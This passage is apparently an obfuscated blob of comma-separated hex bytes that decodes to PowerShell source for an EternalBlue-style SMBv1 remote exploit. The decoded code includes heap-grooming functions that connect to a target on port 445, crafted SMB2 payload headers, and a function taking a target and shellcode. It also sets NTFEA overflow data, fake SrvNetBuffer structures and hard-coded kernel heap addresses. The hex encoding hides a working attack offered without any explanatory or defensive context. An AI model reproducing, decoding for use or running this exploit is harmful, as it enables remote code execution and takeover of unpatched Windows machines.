,30 ,'d' , 'a', 24,70,'6b', 74, 20, '2b' ,'3d',20 ,30, 78,30 , 30 ,'2c' , 30 ,78 , 30 ,30 , 'd' ,'a',24 ,70 , '6b', 74 , 20 , '2b','3d' , 20 ,30, 78 ,66,66, '2c' ,30 , 78 ,66,66 ,'d' , 'a' , 24 , 70 ,'6b',74, 20 ,'2b' , '3d' , 20,30 ,78 ,32 , 66, '2c', 30 ,78 , 34, 62 , 'd' ,'a' ,24, 70, '6b' ,74,20 ,'2b', '3d', 20,30 , 78 , 30 , 30 , '2c',30 ,78,30, 30, 'd','a',24 ,70, '6b',74 ,20, '2b', '3d' ,20 , 30,78,34, 30 ,'2c',30, 78 , 30, 30,'d' , 'a',24 ,70, '6b',74, 20, '2b', '3d', 20 , 30 , 78 , 30 ,63, 'd' , 'a' ,24 ,70, '6b',74 , 20, '2b' ,'3d' ,20,30 ,78 , 66, 66 , 'd', 'a' ,24, 70,'6b' , 74,20 , '2b', '3d' , 20 , 30 , 78, 30 ,30,'d' ,'a', 24 , 70, '6b', 74, 20, '2b' ,'3d', 20, 30,78,30, 30,'2c' ,30, 78 ,30, 30 , 'd','a', 24 , 70 , '6b' ,74,20,'2b', '3d' , 20,30 , 78 , 30 ,30 , '2c',30, 78, 66, 30 ,'d','a' , 24 ,70,'6b',74,20 , '2b', '3d', 20,30,78, 30,32, '2c' ,30, 78, 30 ,30, 'd' , 'a' , 24 ,70 ,'6b' ,74,20,'2b','3d' ,20, 24 ,76, 63 , '6e',75 , '6d' , 'd', 'a' ,24 ,70 ,'6b' ,74, 20 , '2b','3d',20, 30 ,78,30,30, '2c', 30,78 ,30,30 ,'2c' , 30 ,78,30 ,30,'2c' , 30 ,78 , 30,30, 'd','a' , 24,70 ,'6b' , 74, 20, '2b', '3d',20,30, 78,30,30,'2c' , 30 ,78, 30,30,'d' ,'a',24, 70 ,'6b', 74, 20, '2b', '3d' , 20,30 , 78 ,30 , 30, '2c' ,30 ,78 , 30 , 30 ,'2c' ,30 , 78, 30, 30 , '2c' ,30, 78, 30 , 30 , 'd' , 'a', 24 , 70,'6b', 74 , 20 ,'2b','3d' ,20 ,30 ,78 ,30 ,30,'2c' , 30 ,78 ,30 , 30,'2c',30 ,78,30 , 30 ,'2c' ,30, 78, 38 , 30 ,'d' , 'a', 24 , 70 ,'6b',74, 20 , '2b' , '3d' , 20 , 30 ,78,31,36 , '2c',30 ,78 ,30, 30, 'd' ,'a' ,24 , 70 , '6b' ,74,20,'2b','3d', 20 ,24, '6e',61,74 , 69 , 76 ,65,'5f' , '6f', 73, 'd' , 'a' ,24,70 ,'6b' ,74, 20, '2b', '3d' , 20 ,'5b' ,42, 79, 74, 65 , '5b' , '5d', '5d', 20,28 , 30 , 78 , 30, 30 , 29 , 20,'2a' , 20 ,31,37 , 'd' , 'a',72 , 65,74, 75, 72, '6e', 20 , 24, 70,'6b', 74, 'd' , 'a' ,'7d' , 'd' , 'a',66, 75, '6e' ,63, 74 ,69 , '6f','6e',20, 73 , '6d', 62, 32 , '5f', 67,72, '6f' ,'6f' ,'6d' ,73, 28 , 24 , 74,61 , 72, 67,65 ,74, '2c',20, 24,67,72, '6f' ,'6f', '6d', 73,'2c' ,20,24, 70, 61 , 79, '6c', '6f', 61,64, '5f',68 ,64,72, '5f', 70 ,'6b' , 74,'2c' ,20 , 24 , 67 ,72,'6f', '6f' , '6d' ,'5f' , 73 , '6f',63 ,'6b', 73 , 29 ,'7b' , 'd','a', 66 ,'6f' , 72, 28 , 24, 69 ,20 , '3d',30, '3b' ,20 , 24,69, 20 ,'2d', '6c',74, 20, 24 ,67 ,72 ,'6f' , '6f', '6d' ,73,'3b',20,24 ,69,'2b', '2b' , 29 , 'd', 'a','7b' , 'd', 'a',24,63 , '6c', 69,65 ,'6e',74 ,20,'3d',20 ,'6e' ,65 ,57 ,60, '2d' , '6f',62, '6a',45 , 60,63,74,20 ,53 , 79, 73 ,74 , 65, '6d' , '2e','4e',65,74 , '2e',53 ,'6f', 63,'6b' ,65 , 74 , 73 ,'2e' , 54 , 63,70, 43, '6c',69 , 65 ,'6e' ,74, 28, 24 , 74 ,61 , 72, 67 ,65, 74,'2c',34,34 ,35 , 29, 'd' ,'a' , 24 ,67, 73, '6f', 63 , '6b' , 20, '3d' , 20, 24,63, '6c' ,69,65,'6e' , 74 , '2e', 43 , '6c', 69 ,65, '6e', 74,'d' ,'a' , 24,67,72, '6f' ,'6f' , '6d', '5f',73,'6f', 63 ,'6b', 73 , 20 , '2b' ,'3d', 20, 24,67 ,73,'6f', 63,'6b' , 'd', 'a' , 24 , 67, 73, '6f',63,'6b', '2e',53, 65 , '6e', 64 ,28 ,24,70 ,61 , 79 , '6c' ,'6f',61 , 64, '5f' ,68, 64 , 72, '5f' , 70 ,'6b' ,74 ,29,20,'7c' ,20, '4f',55, 54,'2d','4e', 60, 55 ,'6c', '6c' ,'d', 'a' , '7d', 'd' ,'a' ,72 ,65,74, 75, 72 ,'6e',20, 24,67 , 72,'6f' , '6f', '6d', '5f' ,73 ,'6f', 63,'6b', 73, 'd' ,'a' , '7d','d' ,'a',66 , 75, '6e',63 , 74 ,69,'6f','6e', 20,'6d' , 61, '6b',65 ,'5f' ,73 , '6d', 62, 32, '5f' , 70,61, 79,'6c' ,'6f',61,64 , '5f' ,68 ,65 ,61,64, 65, 72 ,73 ,'5f',70 , 61 ,63 ,'6b', 65,74, 28, 29,'7b' ,'d' , 'a' , '5b',42 ,79, 74,65,'5b','5d', '5d', 20, 24 ,70 , '6b',74, 20,'3d' ,20, '5b',42 , 79, 74,65 ,'5b' ,'5d' ,'5d' , 28,30,78 , 30,30 , '2c',30 , 78,30,30, '2c' ,30 , 78, 66 ,66 , '2c' ,30 ,78 , 66 ,37,'2c',30,78, 46 ,45,29 ,20, '2b' , 20, '5b', 73 ,79 ,73 , 74,65, '6d' ,'2e',54, 65 , 78, 74, '2e' , 45, '6e',63 , '6f' , 64 ,69, '6e' ,67 , '5d' ,'3a' , '3a',41 ,53 ,43,49,49,'2e' , 47 , 65,74, 42,79,74 , 65,73 , 28 , 28,27 , 53, '4d', 27,'2b' , 27,42 , 27,29 , 29 , 20,'2b', 20,'5b',42 ,79,74, 65, '5b','5d' , '5d',28, 30, 78 , 30 ,30 , 29 , '2a' ,31, 32 ,34, 'd', 'a', 72 ,65 ,74,75 ,72, '6e' , 20 ,24 ,70, '6b' ,74,'d' ,'a','7d','d' ,'a' ,66 ,75 ,'6e', 63 ,74,69, '6f','6e' , 20, 65,62 , 37,28 ,24 , 74 ,61 , 72,67,65, 74,20, '2c' ,24 ,73,68 , 65 ,'6c' , '6c',63 , '6f' , 64, 65,29,20, '7b' ,'d', 'a' ,24 ,'4e' , 54, 46,45,41, '5f',53 ,49 ,'5a', 45 ,20 , '3d' , 20 , 30, 78,31,31,30 ,30 , 30,'d' ,'a' ,24 ,'6e',74 , 66 , 65 , 61,31, 30, 30, 30 , 30 , '3d' , 30,78, 30 ,30, '2c',30 ,78 , 30,30 , '2c', 30,78 ,64 , 64 ,'2c' , 30, 78 , 66 ,66,'2b', '5b' , 62 ,79 ,74 , 65, '5b', '5d' ,'5d', 30 , 78, 34 ,31,'2a', 30 ,78 ,66,66 , 64 , 65 ,'d' , 'a',24, '6e', 74,66 ,65 ,61 ,31 ,31 ,30,30, 30, 20 ,'3d' , 28 , 30 ,78,30 , 30 , '2c',30,78 , 30 ,30 , '2c',30,78, 30, 30,'2c' , 30 ,78 , 30, 30, '2c' ,30,78 ,30 , 30, 29 ,'2a' ,36 , 30,30, 'd' , 'a' , 24 , '6e' ,74 , 66, 65,61 , 31,31,30 ,30 ,30, 20,'2b' , '3d' , 30 ,78 , 30,30 ,'2c', 30 , 78 , 30, 30, '2c',30,78 , 62, 64 , '2c' ,30 ,78,66,33 ,'2b' ,'5b' ,62 ,79 , 74 ,65 , '5b' ,'5d' , '5d',30 , 78 ,34,31,'2a',30, 78 ,66 ,33 , 62 ,65 ,'d', 'a' ,24 , '6e' , 74, 66, 65 ,61 ,31 , 66 , 30 , 30 ,30, '3d',28 , 30 ,78 , 30,30 ,'2c' , 30 ,78,30 , 30,'2c' , 30 , 78 , 30, 30, '2c', 30 ,78 ,30, 30,'2c', 30 ,78, 30 , 30 , 29,'2a' , 30 , 78, 32 ,34 , 39, 34, 'd','a' ,24 , '6e',74,66 ,65,61 , 31 , 66,30 , 30 , 30, '3d',30, 78,30,30 ,'2c' , 30, 78,30 , 30, '2c' ,30, 78,65 ,64 ,'2c',30 , 78,34,38,'2b' ,30, 78,34 ,31,'2a' ,30, 78 ,34, 38, 65 ,65 , 'd', 'a', 24 , '6e', 74 ,66 , 65, 61 ,'3d' ,40,'7b' ,30,78 , 31 ,30,30 , 30 , 30 ,'3d' ,24,'6e' ,74, 66 ,65, 61,31 ,30,30 , 30 , 30, '3b',30, 78,31 , 31, 30,30 ,30, '3d', 24,'6e' , 74 , 66,65 , 61,31, 31, 30 ,30,30 ,'7d' ,'d', 'a' ,24, 54, 41 , 52,47 ,45,54, '5f',48,41 , '4c' , '5f', 48,45 ,41 ,50 ,'5f' , 41, 44 , 44 , 52,'5f' ,78 , 36,34,20 , '3d', 20, 30,78 , 66, 66 ,66, 66, 66, 66 , 66 , 66 ,66,66, 64, 30, 30 ,30, 31, 30,'d', 'a', 24 ,54,41 ,52,47,45, 54 , '5f', 48, 41, '4c' , '5f', 48,45,41,50 ,'5f',41 , 44 ,44 , 52 , '5f' , 78 , 38 ,36,20 ,'3d',20,30, 78 ,66 ,66, 64,66 , 66 ,30, 30 ,30,'d' , 'a','5b',62,79 ,74 ,65 ,'5b' ,'5d','5d', 24,66 ,61 , '6b' ,65,53,72,76, '4e' ,65,74, 42 ,75, 66 ,66 ,65 , 72 , '4e' , 73,61 , 20 , '3d', 20 , 40 , 28,30 ,78 ,30 , 30,'2c',30 , 78,31, 30 ,'2c',30,78 ,30 ,31, '2c' ,30 ,78,30 , 30,'2c' ,30, 78 , 30, 30,'2c', 30 ,78,30,30, '2c',30, 78 , 30, 30 ,'2c' , 30 , 78 ,30, 30, '2c' , 30 , 78, 30 , 30, '2c', 30 ,78 , 31 , 30 , '2c' , 30 ,78 , 30, 31,'2c',30 , 78,30 ,30,'2c',30, 78 , 30, 30, '2c', 30 , 78 ,30,30, '2c' , 30, 78 ,30 , 30,'2c' ,30, 78, 30,30, '2c' ,30 , 78,66,66 ,'2c',30 ,78, 66,66 , '2c' , 30,78 ,30 , 30 , '2c' ,30,78, 30,30,'2c', 30 ,78,30,30 ,'2c' , 30 , 78, 30 ,30,'2c' ,30 , 78 , 30,30, '2c', 30 ,78, 30, 30,'2c' , 30 , 78, 66,66 ,'2c',30 ,78 ,66,66 ,'2c' , 30 ,78,30, 30, '2c', 30, 78 ,30,30 ,'2c',30, 78, 30 ,30 ,'2c' ,30 , 78, 30 , 30,'2c', 30 , 78, 30, 30 ,'2c' ,30 ,78 , 30 ,30 ,'2c', 30,78, 30, 30 , '2c' ,30 ,78 , 30,30 ,'2c', 30 ,78 , 30 ,30,'2c' , 30 ,78,30, 30, '2c',30, 78,30 ,30 , '2c',30 , 78 ,30 ,30,'2c', 30 ,78 ,30, 30,'2c', 30, 78,30 ,30,'2c' , 30 ,78 ,30 ,30 ,'2c', 30 ,78,30 ,30 , '2c',30,78 , 30 , 30, '2c' ,30 , 78, 30 ,30 , '2c', 30 , 78 ,30,30, '2c' ,30 ,78 , 30, 30, '2c' ,30, 78 , 30,30, '2c',30, 78 , 30 , 30 ,'2c' ,30 ,78 , 30,30, '2c' , 30 , 78 , 66,31, '2c',30, 78 ,64, 66,'2c',30, 78 , 66, 66,'2c' , 30 , 78, 30 , 30 , '2c' ,30,78, 30,30 , '2c', 30 , 78, 30, 30, '2c', 30 ,78 ,30 ,30, '2c' ,30,78 , 30, 30 , '2c',30 , 78,30, 30 , '2c',30, 78 ,30, 30 , '2c',30,78 , 30 ,30, '2c', 30 ,78 , 32, 30,'2c' , 30 , 78,66, 30 ,'2c' , 30 , 78 ,64 ,66 ,'2c', 30 ,78 , 66,66, '2c', 30 , 78,30,30 , '2c' , 30 ,78,66 ,31 , '2c', 30 , 78, 64, 66, '2c' ,30 ,78,66 , 66, '2c', 30, 78,30 , 30 , '2c' ,30,78 ,30, 30, '2c' , 30 , 78 ,30 ,30,'2c', 30,78, 30 , 30,'2c' , 30, 78, 36 ,30,'2c' , 30 , 78 , 30 ,30 , '2c', 30 , 78 ,30 ,34, '2c',30 ,78, 31,30, '2c' ,30 ,78,30 ,30 ,'2c',30, 78,30 , 30,'2c',30,78 ,30,30, '2c', 30 ,78,30, 30 ,'2c' , 30 ,78,38, 30, '2c', 30,78 ,65 ,66 ,'2c' ,30 , 78,64 , 66 , '2c',30, 78 ,66 , 66,'2c',30 , 78 ,30 , 30,'2c' ,30, 78 , 30 , 30 , '2c',30 ,78,30,30, '2c' ,30,78 , 30, 30, '2c',30,78 ,31 , 30,'2c' , 30 , 78 ,30 ,30 ,'2c', 30, 78 , 64, 30 , '2c', 30,78 ,66 , 66, '2c' ,30 , 78 ,66 , 66,'2c' ,30, 78 , 66,66 ,'2c',30 , 78,66 , 66 , '2c' , 30 , 78 ,66 ,66,'2c',30, 78,31,30, '2c',30 ,78 ,30,31,'2c' ,30 ,78, 64, 30 ,'2c' , 30,78 , 66, 66, '2c' ,30 , 78 ,66 ,66, '2c', 30, 78 , 66, 66 ,'2c', 30 , 78, 66 , 66,'2c' , 30 ,78 , 66, 66 , '2c' , 30 ,78 ,30 ,30 , '2c', 30, 78 ,30 , 30, '2c' ,30,78,30 , 30 ,'2c', 30 , 78,30 ,30, '2c',30 , 78 ,30 ,30, '2c' ,30, 78 ,30 , 30 , '2c', 30 , 78,30, 30,'2c', 30 , 78, 30, 30, '2c' ,30 , 78 , 30,30, '2c' , 30 ,78, 30, 30,'2c' ,30 ,78, 30,30,'2c' , 30 ,78 ,30 , 30, '2c' ,30 , 78 ,30, 30 ,'2c' ,30, 78 ,30 ,30,'2c' , 30 ,78 ,30 , 30, '2c',30,78,30,30 ,'2c',30 ,78 , 36 ,30 ,'2c',30 ,78,30 , 30 ,'2c',30 ,78,30 , 34,'2c' , 30 ,78,31 ,30 , '2c' , 30 , 78 , 30 ,30 ,'2c',30,78,30 ,30 ,'2c',30, 78 ,30,30,'2c' ,30, 78,30 , 30 ,'2c' , 30 ,78 , 30,30 ,'2c',30, 78, 30,30 ,'2c', 30 , 78 , 30, 30 , '2c' , 30 , 78 ,30 ,30,'2c' , 30,78 ,30,30 ,'2c', 30 ,78, 30, 30,'2c' , 30,78, 30 ,30, '2c' , 30 ,78, 30 , 30 ,'2c' ,30,78 ,39, 30 ,'2c', 30 ,78 ,66,66 , '2c' , 30 ,78, 63,66,'2c',30, 78, 66 , 66,'2c',30, 78,66 ,66, '2c', 30 , 78 , 66 , 66 ,'2c' ,30,78 , 66,66, '2c' ,30,78 , 66,66 ,29,'d','a' , '5b', 62 ,79,74 ,65 , '5b' , '5d' , '5d' ,24, 66,61, '6b' , 65,53,72 ,76, '4e', 65, 74 , 42 , 75, 66,66, 65, 72, 58 ,36 ,34 , 20, '3d',20 ,40, 28 , 30, 78 ,30, 30, '2c' ,30, 78 , 31, 30 , '2c' , 30,78, 30, 31 ,'2c',30 , 78,30 ,30,'2c', 30 ,78 , 30, 30,'2c' ,30,78, 30, 30 ,'2c',30, 78 ,30,30,'2c', 30, 78 , 30, 30 ,'2c' , 30, 78, 30,30, '2c',30 ,78,31 , 30 ,'2c' , 30 ,78,30, 31 ,'2c' ,30 ,78, 30 , 30,'2c' ,30,78 , 30 , 30 ,'2c' , 30, 78,30 ,30 ,'2c',30, 78, 30 ,30, '2c', 30,78, 30 ,30 ,'2c' ,30,78 ,66, 66 ,'2c', 30 , 78,66,66, '2c', 30 , 78 ,30,30,'2c',30 , 78 , 30 , 30, '2c', 30 ,78 , 30,30 ,'2c' , 30, 78, 30 ,30, '2c',30, 78 ,30 , 30 , '2c', 30 ,78, 30 , 30 ,'2c',30 ,78, 30, 30,'2c' , 30, 78,30 ,30 ,'2c', 30,78 ,30 , 30,'2c' ,30 ,78, 30,30 , '2c' , 30 , 78, 30,30 , '2c' ,30,78, 30 ,30,'2c', 30 , 78, 30 ,30 , '2c' , 30 , 78 ,30 ,30 , '2c' ,30 , 78, 30 , 30,'2c' ,30 ,78,30, 30,'2c' , 30, 78 ,30 ,30,'2c' , 30,78,30 ,30, '2c' , 30,78, 30, 30,'2c' , 30 ,78, 30 , 30,'2c' ,30 , 78, 30,30 ,'2c', 30 ,78,30,30, '2c',30 ,78, 30 ,30 ,'2c' , 30, 78,30,30,'2c', 30 ,78,30, 30, '2c' , 30 ,78 , 30,30, '2c', 30 ,78 , 30, 30 ,'2c' , 30, 78,30 , 30 , '2c', 30,78, 30,30,'2c' ,30 ,78, 30,30, '2c', 30, 78, 30, 30,'2c',30 , 78 ,30 , 30 ,'2c' ,30 , 78 ,30, 30, '2c' , 30 ,78, 30 ,30 , '2c', 30,78 ,30 , 30 ,'2c',30 ,78, 30 , 30, '2c' , 30 , 78, 30, 30 , '2c',30 , 78, 30,30 ,'2c',30,78, 30, 30 , '2c', 30,78 , 30,30 ,'2c' , 30,78,30, 30 ,'2c',30 ,78 , 30,30,'2c' , 30, 78,30, 30,'2c' , 30 ,78,30 , 30 ,'2c',30,78,30 ,30,'2c' ,30 , 78 ,30,30, '2c' ,30, 78, 30 , 30 , '2c' , 30 ,78,30 ,30, '2c', 30 ,78 ,30,30 , '2c' ,30,78 ,30 ,30, '2c', 30 ,78,30 , 30,'2c',30 ,78 , 30, 30 ,'2c' ,30 , 78 ,30, 30 , '2c', 30 ,78 ,30, 30, '2c' , 30 , 78 ,30 ,30 , '2c' ,30, 78,30 , 30 ,'2c', 30 ,78,30, 30, '2c',30,78 , 30 ,30, '2c',30,78 , 30 ,30 , '2c' ,30 ,78 ,30,30,'2c', 30 ,78,30 ,30, '2c' ,30 , 78,30, 30, '2c',30 ,78 ,30,30,'2c' ,30 , 78,30 ,30,'2c',30,78, 30,30 ,'2c' ,30,78,30 ,30 ,'2c',30,78 , 30, 30, '2c',30 ,78,30 ,30 ,'2c',30, 78 , 30,30, '2c', 30 , 78 ,30 ,30 , '2c', 30 ,78,31,30,'2c' ,30, 78 ,30 , 30 ,'2c', 30, 78, 64,30 , '2c',30,78, 66,66 ,'2c', 30,78 ,66, 66, '2c' , 30,78 , 66,66 , '2c' ,30, 78, 66, 66 , '2c',30 , 78,66 ,66,'2c',30,78 , 31, 30,'2c' ,30, 78 , 30 ,31 ,'2c',30, 78 ,64 , 30,'2c', 30, 78 , 66 ,66, '2c' ,30,78 ,66,66, '2c',30 ,78, 66, 66 , '2c' ,30, 78,66 ,66,'2c',30,78,66 , 66,'2c', 30, 78, 30 ,30,'2c' , 30,78 ,30 , 30 , '2c' ,30 , 78 ,30,30, '2c' ,30 , 78 ,30 , 30 ,'2c',30,78 , 30 ,30, '2c',30 ,78, 30, 30,'2c', 30, 78,30,30,'2c',30,78,30 ,30, '2c', 30 , 78, 30 ,30, '2c',30, 78,30,30, '2c', 30,78,30, 30, '2c', 30,78 , 30 , 30, '2c' , 30 , 78, 30 , 30,'2c' , 30,78,30 , 30,'2c',30, 78 , 30 ,30 ,'2c', 30, 78 , 30, 30 , '2c',30,78 , 36 , 30 , '2c', 30, 78, 30,30, '2c',30 , 78,30,34, '2c' , 30 , 78,31,30 ,'2c',30,78 ,30 , 30, '2c' ,30 ,78, 30 ,30, '2c' ,30, 78 ,30 , 30, '2c', 30 , 78,30 ,30 ,'2c', 30, 78, 30,30 ,'2c' ,30,78 , 30 ,30 ,'2c' , 30,78 , 30 ,30, '2c' , 30 , 78 , 30,30 , '2c',30 , 78 , 30, 30, '2c' , 30 ,78 , 30 , 30 , '2c' , 30 , 78,30 , 30,'2c' , 30,78, 30 , 30,'2c',30,78,39,30 , '2c',30 , 78 ,66 ,66 , '2c',30,78, 63 , 66,'2c', 30, 78 , 66 , 66, '2c' , 30,78,66,66, '2c',30 ,78, 66 ,66 ,'2c', 30, 78 ,66 ,66 , '2c',30,78 , 66 , 66,29 ,'d', 'a',24 ,66 , 61 , '6b', 65,53 , 72 ,76, '4e', 65, 74 , 42,75,66, 66, 65,72 , 20,'3d' ,20,24 , 66 ,61, '6b', 65,53,72 , 76,'4e' ,65, 74, 42 , 75,66 , 66,65, 72,'4e',73 ,61,'d' , 'a' ,'5b' , 62,79, 74 , 65, '5b', '5d','5d' ,24,66 ,65, 61, '4c' , 69 , 73 , 74, '3d', '5b', 62 ,79, 74,65 , '5b', '5d','5d',28, 30, 78 , 30,30 ,'2c' ,30, 78 , 30 ,30 ,'2c' ,30 ,78, 30, 31,'2c' ,30,78 ,30, 30, 29 ,'d','a' , 24 , 66 ,65 , 61,'4c' ,69, 73,74 ,20 , '2b' , '3d',20 , 24,'6e' , 74, 66 ,65 ,61 , '5b',24 , '4e',54 , 46 ,45,41 , '5f' ,53 ,49 ,'5a' , 45 , '5d' , 'd' , 'a',24, 66, 65, 61 ,'4c' ,69 ,73 , 74, 20 ,'2b','3d', 30, 78 ,30,30 , '2c' ,30 , 78, 30 , 30 , '2c' ,30,78 , 38, 66,'2c', 30 , 78, 30 ,30, '2b' , 20 ,24,66,61 ,'6b' , 65, 53 , 72, 76, '4e' , 65, 74 , 42 ,75,66 ,66,65, 72, 'd' ,'a' ,24, 66 ,65, 61,'4c',69 , 73 ,74,20 , '2b' ,'3d', 30 ,78, 31,32 , '2c' , 30 ,78 , 33 , 34,'2c' ,30,78 , 37 , 38, '2c' ,30 ,78 , 35 , 36 , 'd' , 'a','5b' , 62, 79 , 74, 65 ,'5b','5d' ,'5d', 24 , 66,61 ,'6b' , 65, '5f' ,72 ,65,63,76 ,'5f' , 73,74 ,72 ,75, 63,74 ,'3d',40 ,28 ,30, 78 ,30,30,'2c',30,78,30,30 , '2c' ,30,78 , 30,30,'2c' ,30 , 78,30 ,30 ,'2c',30,78, 30 ,30 ,'2c',30, 78 , 30 , 30,'2c', 30 ,78, 30, 30,'2c', 30 , 78,30,30 , '2c', 30,78,30, 33 ,'2c',30 , 78, 30 , 30, '2c' ,30 ,78 , 30 ,30 , '2c',30 ,78 ,30,30 , '2c' ,30,78, 30 ,30 ,'2c',30,78 ,30 ,30 ,'2c',30 ,78,30, 30, '2c' , 30, 78, 30 ,30, '2c' , 30 , 78 ,30 , 30 , '2c', 30 ,78, 30, 30, '2c', 30,78 , 30,30 ,'2c', 30, 78, 30,30 , '2c',30 ,78 ,30 , 30, '2c',30, 78, 30 , 30,'2c',30 ,78 ,30,30 ,'2c', 30, 78 , 30 ,30 ,'2c',30 ,78 ,30, 30,'2c',30 , 78, 30, 30 , '2c', 30,78, 30,30, '2c', 30,78 , 30, 30, '2c',30 ,78 , 30 ,30 ,'2c' ,30 , 78,30 , 30,'2c' ,30 ,78 , 30 , 30, '2c', 30 ,78 , 30,30,'2c' ,30,78 , 30 ,30 ,'2c' , 30, 78,30 , 30 , '2c',30,78 ,30 , 30 ,'2c',30, 78, 30,30,'2c', 30 , 78,30 , 30 , '2c',30 ,78,30,30,'2c' ,30,78,30 ,30 ,'2c' ,30 , 78,30 , 30, '2c', 30 ,78 , 30 , 33 , '2c' ,30 ,78 , 30 ,30 , '2c', 30 ,78, 30,30 , '2c',30 , 78 , 30, 30,'2c', 30 , 78 ,30,30,'2c' ,30 ,78 ,30 ,30 ,'2c',30, 78 ,30 ,30,'2c' , 30, 78, 30 ,30 ,'2c', 30 ,78,30 , 30 , '2c' , 30,78 , 30,30 ,'2c',30,78 ,30 ,30, '2c',30 , 78, 30 ,30 ,'2c' , 30, 78 ,30, 30, '2c',30 , 78,30,30, '2c' , 30,78 ,30 , 30 , '2c' , 30, 78, 30 ,30,'2c', 30,78 ,30 ,30 ,'2c' , 30 ,78, 30, 30,'2c' , 30 ,78 , 30 ,30,'2c' ,30 , 78,30, 30 ,'2c', 30 ,78 ,30, 30, '2c' , 30 , 78 ,30 , 30, '2c' ,30,78 ,30, 30 ,'2c' , 30 ,78 ,30 , 30,'2c', 30 ,78 ,30,30 , '2c' , 30 ,78,30 ,30, '2c', 30 ,78,30, 30 ,'2c' , 30 ,78 ,30 , 30, '2c' , 30,78, 30 ,30 ,'2c' , 30 , 78,30, 30 , '2c',30 ,78 , 30,30, '2c', 30,78,30,30 ,'2c' , 30,78,30, 30 ,'2c' , 30 , 78, 30, 30,'2c' , 30 , 78 ,30 ,30,'2c', 30 , 78 , 30,30, '2c', 30 , 78 ,30 ,30 ,'2c' , 30, 78,30, 30 ,'2c',30, 78, 30, 30 ,'2c' ,30 , 78, 30,30, '2c' , 30 ,78,30 , 30 ,'2c',30 , 78,30 ,30 , '2c', 30 ,78, 30 ,30,'2c' , 30,78,30,30, '2c', 30 , 78 ,30, 30 ,'2c',30,78 ,30,30, '2c', 30 ,78 ,30, 30,'2c',30 ,78 , 30 ,30,'2c' , 30,78 ,30 ,30,'2c' ,30, 78,30 ,30 ,'2c',30,78 ,30,30, '2c' ,30,78 ,30 ,30, '2c', 30 ,78 , 30 , 30 , '2c' , 30,78, 30 , 30 ,'2c' , 30,78 , 30 , 30 ,'2c' ,30,78 , 30, 30, '2c',30 , 78,30,30 , '2c',30 , 78 , 30 ,30,'2c', 30, 78,30, 30 ,'2c' , 30, 78,30,30 ,'2c' ,30 ,78,30 , 30, '2c',30 ,78, 30 , 30,'2c', 30, 78, 30 , 30 ,'2c' ,30 ,78 , 30,30,'2c' , 30 ,78,30 ,30,'2c' , 30, 78, 30, 30 , '2c' , 30,78 ,30 , 30, '2c', 30, 78,30 , 30, '2c',30 , 78 , 30 ,30 ,'2c' ,30,78, 30, 30 ,'2c',30, 78 ,30,30 , '2c' ,30 ,78,30 ,30 , '2c', 30, 78 , 30 , 30 , '2c',30, 78, 30, 30 ,'2c', 30,78, 30,30, '2c', 30,78 ,30 , 30,'2c',30 ,78, 30,30,'2c',30 ,78 , 30, 30, '2c' , 30,78 ,30 , 30, '2c' , 30, 78, 30, 30 , '2c' ,30,78 ,30,30 , '2c' , 30 , 78, 30 , 30 , '2c',30 , 78,30,30 ,'2c', 30,78 , 30,30, '2c' , 30,78, 30,30 , '2c',30 , 78 ,30, 30, '2c' ,30 , 78 ,30, 30 ,'2c' ,30 ,78 ,30, 30 ,'2c', 30 , 78 , 30, 30, '2c' , 30 ,78, 30,30, '2c',30,78, 30,30,'2c',30, 78, 30, 30 , '2c', 30, 78 ,30 ,30,'2c', 30, 78 ,30 ,30, '2c' , 30, 78 , 30, 30 , '2c' , 30, 78 ,30 ,30 ,'2c', 30 , 78,30, 30,'2c' ,30, 78,30, 30, '2c' ,30, 78,30,30,'2c',30,78 ,30, 30, '2c',30,78 ,30 , 30, '2c' ,30, 78 , 30, 30 , '2c',30 ,78 , 30 ,30 ,'2c',30 ,78 , 30 ,30 ,'2c' ,30,78 ,30, 30,'2c' ,30, 78 , 30,30 , '2c', 30 ,78, 30,30 , '2c' ,30,78 , 30 ,30,'2c',30 ,78 , 30,30,'2c',30,78,30,30 , '2c',30, 78, 30,30 , '2c', 30 ,78 ,30 ,30,'2c',30, 78 ,30 , 30 ,'2c' ,30 ,78 ,30, 30,'2c', 30 , 78 ,30,30,'2c', 30 ,78,30 ,30 , '2c',30, 78,30 , 30 , '2c' , 30,78,30 ,30, '2c' , 30 ,78 ,30 , 30 , '2c', 30,78,30 ,30,'2c' , 30 ,78,62 , 30 , '2c' ,30, 78, 30,30 , '2c' , 30 ,78,64 ,30,'2c',30 ,78 , 66 , 66, '2c', 30 ,78, 66, 66,'2c',30, 78 ,66 ,66 ,'2c' ,30,78 ,66 ,66 , '2c', 30 , 78, 66 ,66 ,'2c', 30, 78 , 62 , 30 , '2c' ,30, 78 ,30, 30,'2c',30, 78 ,64, 30 , '2c' , 30 , 78,66, 66, '2c', 30,78 , 66 , 66,'2c' ,30,78 ,66,66, '2c' , 30 , 78 , 66 ,66 ,'2c' , 30, 78, 66 , 66, '2c',30 , 78 ,30 , 30 , '2c' ,30 ,78 ,30,30, '2c' ,30, 78 , 30,30,'2c', 30, 78 , 30,30, '2c' , 30 ,78 ,30 , 30, '2c',30 ,78 ,30 ,30,'2c', 30,78 , 30 ,30 ,'2c' ,30, 78, 30,30,'2c', 30 , 78,30 , 30, '2c',30, 78, 30,30 , '2c',30 ,78,30,30, '2c', 30, 78 ,30 , 30 , '2c' ,30 , 78 , 30 ,30,'2c',30,78 , 30,30 , '2c' , 30 , 78, 30, 30, '2c',30 ,78 , 30 , 30 , '2c' ,30, 78 ,63 ,30,'2c' , 30, 78,66,30, '2c', 30 , 78 ,64 , 66 , '2c' , 30, 78,66 ,66,'2c',30, 78,63 ,30,'2c' ,30 ,78,66 , 30 , '2c',30 , 78,64 ,66, '2c' , 30, 78 ,66, 66 ,'2c', 30 , 78 ,30, 30,'2c' ,30 , 78 ,30,30 , '2c',30 , 78 , 30,30, '2c', 30, 78 ,30,30 , '2c', 30,78 , 30,30,'2c' , 30 ,78 ,30, 30, '2c', 30,78, 30,30 , '2c' , 30,78 ,30 ,30 ,'2c', 30,78,30,30 ,'2c' ,30 , 78 , 30, 30, '2c',30 , 78 ,30 ,30 , '2c',30, 78 ,30 , 30 , '2c' , 30,78, 30 , 30, '2c' , 30 ,78 , 30,30 , '2c' ,30 ,78 , 30,30, '2c' ,30,78 ,30, 30,'2c' ,30 ,78, 30 ,30 , '2c',30 ,78,30,30, '2c', 30 ,78, 30,30 ,'2c',30,78 , 30, 30 , '2c', 30 ,78,30 ,30, '2c' , 30, 78, 30 ,30 , '2c',30,78,30,30 , '2c',30 ,78 ,30, 30, '2c',30, 78,30, 30 , '2c',30, 78 , 30 , 30 